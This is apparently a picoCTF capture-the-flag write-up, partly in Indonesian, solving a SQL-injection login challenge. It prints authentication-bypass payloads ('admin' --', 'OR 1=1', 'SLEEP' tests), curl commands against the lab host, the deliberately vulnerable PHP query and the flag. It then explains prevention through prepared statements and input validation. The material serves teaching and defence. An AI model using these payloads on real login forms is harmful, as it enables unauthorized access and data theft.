# Irish-Name-Repo 1 - Writeup

## Challenge Information

- **Name:** Irish-Name-Repo 1
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Points:** (varies)
- **URL:** `http://fickle-tempest.picoctf.net:59157`

---

## Description

Challenge ini adalah pengenalan pertama ke **SQL Injection**. Website memiliki form login yang vulnerable terhadap SQL injection karena tidak melakukan proper input sanitization.

---

## Reconnaissance

### Step 1: Explore the website

```bash
curl http://fickle-tempest.picoctf.net:59157
```

Menemukan redirect ke `/login.html`

### Step 2: Analyze login form

```html
<form action="login.php" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="hidden" name="debug" value="0">
</form>
```

**Key Observations:**
- Form mengirim POST ke `login.php`
- Ada field username dan password
- Ada **hidden field `debug`** - bisa berguna untuk debugging!

---

## Concept: SQL Injection

### Apa itu SQL Injection?

SQL Injection adalah teknik exploit dimana attacker memasukkan kode SQL berbahaya ke dalam input yang kemudian dieksekusi oleh database.

### Vulnerability: Unsafe Query Construction

**Vulnerable Code (Backend):**
```php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
```

**Masalah:**
Input user langsung dimasukkan ke query tanpa sanitization!

---

## How SQL Injection Works

### Normal Login Flow

**Input:**
- Username: `admin`
- Password: `password123`

**Query:**
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123'
```

**Result:** Login berhasil jika data cocok

---

### SQL Injection Attack

**Input:**
- Username: `admin' --`
- Password: `anything`

**Query yang Terbentuk:**
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

**Yang Dieksekusi:**
```sql
SELECT * FROM users WHERE username = 'admin'
```

**Breakdown:**
1. `'admin'` - Menutup string username
2. `--` - SQL comment, membuat sisanya diabaikan
3. `AND password = 'anything'` - Tidak dieksekusi (di-comment)
4. Query hanya cek username, **password di-bypass!**

---

## SQL Injection Characters

### Special Characters:

| Character | Function | Example |
|-----------|----------|---------|
| `'` | String delimiter | Escape dari string |
| `--` | Comment (SQL) | Ignore sisanya |
| `#` | Comment (MySQL) | Ignore sisanya |
| `;` | Query separator | Multiple queries |
| `OR` | Logical operator | `OR 1=1` |

---

## Solution

### Method 1: Browser (Manual)

1. Akses `http://fickle-tempest.picoctf.net:59157/login.html`
2. Username: `admin' --`
3. Password: `test` (atau apapun)
4. Submit
5. Get flag!

### Method 2: Using curl

```bash
curl -X POST http://fickle-tempest.picoctf.net:59157/login.php \
  -d "username=admin' --&password=test&debug=0"
```

### Method 3: With debug mode

```bash
curl -X POST http://fickle-tempest.picoctf.net:59157/login.php \
  -d "username=admin' --&password=test&debug=1"
```

Debug mode mungkin menampilkan SQL query yang dieksekusi!

---

## Alternative Payloads

### Payload 1: OR 1=1 (Universal bypass)
```sql
Username: ' OR 1=1 --
Password: anything
```

**Query:**
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = 'anything'
```

**Result:** `1=1` selalu true, return semua users (biasanya admin first)

---

### Payload 2: OR 'a'='a
```sql
Username: ' OR 'a'='a
Password: anything
```

**Query:**
```sql
SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = 'anything'
```

---

### Payload 3: MySQL Comment
```sql
Username: admin'#
Password: anything
```

**Query:**
```sql
SELECT * FROM users WHERE username = 'admin'#' AND password = 'anything'
```

---

## Flag

```
picoCTF{s0m3_SQL_85832275}
```

---

## Visual Explanation

### Template Query:
```
SELECT * FROM users WHERE username = 'XXXXX' AND password = 'YYYYY'
```

### Our Input:
```
Username: admin' --
Password: test
```

### Substitution:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'test'
                                      ^^^^^^  ^^  ^^^^^^^^^^^^^^^^^^^
                                        |      |          |
                                        |      |          └─ IGNORED (comment)
                                        |      └─ Comment marker
                                        └─ Valid username
```

### What SQL Executes:
```sql
SELECT * FROM users WHERE username = 'admin'
```

**Result:** Login without password! ✅

---

## Key Takeaways

### Security Lessons:

1. **Never trust user input**
   - All input must be sanitized
   - Validate and escape special characters

2. **Use Prepared Statements**
   ```php
   // ❌ VULNERABLE
   $query = "SELECT * FROM users WHERE username = '$username'";
   
   // ✅ SECURE
   $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
   $stmt->execute([$username]);
   ```

3. **Principle of Least Privilege**
   - Database user should have minimal permissions
   - Don't use root/admin for web apps

4. **Input Validation**
   - Whitelist allowed characters
   - Reject suspicious patterns

### Technical Skills:

- ✅ Understanding SQL syntax
- ✅ SQL Injection techniques
- ✅ Comment exploitation
- ✅ Logical operators in SQL
- ✅ curl POST requests

---

## Impact of SQL Injection

SQL Injection dapat menyebabkan:
- ❌ Unauthorized access (bypass authentication)
- ❌ Data breach (steal database)
- ❌ Data modification (update/delete records)
- ❌ Remote code execution (dalam kasus ekstrem)

**OWASP Top 10:** SQL Injection adalah salah satu vulnerability paling berbahaya!

---

## Prevention Methods

### 1. Prepared Statements (Best Practice)

**PHP (PDO):**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Python:**
```python
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", 
               (username, password))
```

**Node.js:**
```javascript
connection.query("SELECT * FROM users WHERE username = ? AND password = ?", 
                [username, password]);
```

### 2. Input Validation

```php
// Whitelist validation
if (!preg_match('/^[a-zA-Z0-9]+$/', $username)) {
    die("Invalid username");
}

// Escape special characters
$username = mysqli_real_escape_string($conn, $username);
```

### 3. ORM (Object-Relational Mapping)

```python
# Using Django ORM (secure by default)
user = User.objects.get(username=username, password=password)
```

### 4. Web Application Firewall (WAF)

- ModSecurity
- Cloudflare WAF
- AWS WAF

---

## Testing for SQL Injection

### Quick Tests:

```
# Test 1: Single quote
username: '
Expected: SQL error or unusual behavior

# Test 2: Comment
username: admin' --
Expected: Bypass if vulnerable

# Test 3: OR condition
username: ' OR 1=1 --
Expected: Bypass if vulnerable

# Test 4: Time-based
username: ' OR SLEEP(5) --
Expected: 5 second delay if vulnerable
```

---

## Tools for SQL Injection

- **sqlmap** - Automated SQL injection tool
- **Burp Suite** - Web proxy for manual testing
- **OWASP ZAP** - Security scanner
- **curl** - Command-line testing

---

## Related Challenges

- Irish-Name-Repo 2 (Intermediate SQL Injection)
- Irish-Name-Repo 3 (Advanced SQL Injection)
- SQL injection challenges on:
  - HackTheBox
  - TryHackMe
  - PortSwigger Academy

---

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [sqlmap Documentation](https://sqlmap.org/)

---

## Practice More

Want to practice more SQL Injection?
- PortSwigger Web Security Academy (FREE labs)
- DVWA (Damn Vulnerable Web Application)
- bWAPP
- WebGoat

---

**Date Solved:** February 2026  
**Difficulty Rating:** ⭐⭐☆☆☆ (2/5)  
**Time Spent:** ~30 minutes
